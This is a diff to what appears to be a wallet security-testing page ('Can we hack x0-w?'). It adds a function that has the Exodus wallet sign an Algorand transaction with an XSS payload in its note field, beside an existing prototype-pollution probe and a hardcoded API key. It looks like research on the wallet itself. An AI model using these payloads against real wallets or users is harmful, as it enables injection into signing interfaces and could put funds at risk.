@@ -66,6 +66,43 @@
             }
 
 
+            async function asset_transaction() {
+                const baseServer = "https://mainnet-algorand.api.purestake.io/ps2";
+                const port = "";
+                const token = {
+                    'X-API-key': 'tOke4cvG802DWgj3lTTu166RPeMBqze4aZGl6miq',
+                };
+                const algodClient = new algosdk.Algodv2(token, baseServer, port);
+
+                let assetID = (5235235);
+
+                params = await algodclient.getTransactionParams().do();
+                //comment out the next two lines to use suggested fee
+                params.fee = 1000;
+                params.flatFee = true;
+
+                const enc = new TextEncoder();
+                const note = enc.encode("<script>alert(1)</script>");
+
+                let sender = window.exodus.algorand.address;
+                let recipient = sender;
+                let revocationTarget = undefined;
+                let closeRemainderTo = window.exodus.algorand.address;
+                // We are sending 0 assets
+                amount = 0;
+
+
+                // signing and sending "txn" allows sender to begin accepting asset specified by creator and index
+                let opttxn = algosdk.makeAssetTransferTxnWithSuggestedParams(sender, recipient, closeRemainderTo, revocationTarget, amount, note, assetID, params);
+
+                const signedTransactions = await window.exodus.algorand.signTransaction([
+                opttxn.toByte(),
+                ]);
+                console.log('Tran: ');
+                console.log(signedTransactions);
+            }
+
+
             function prot_pollute() {
                 window.exodus.p = {}
                 window.exodus.p["__proto__"]["isConnected"] = true
@@ -110,7 +147,7 @@
 
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #3A6">
         <h1 style="color:#E00;text-shadow: 2px 2px 4px #0f0;">
-        33
+        34
         </h1>
         <h2>Can we hack x0-w?</h2>
         <input type="button" value="algo_connect" onclick="algo_connect()" />
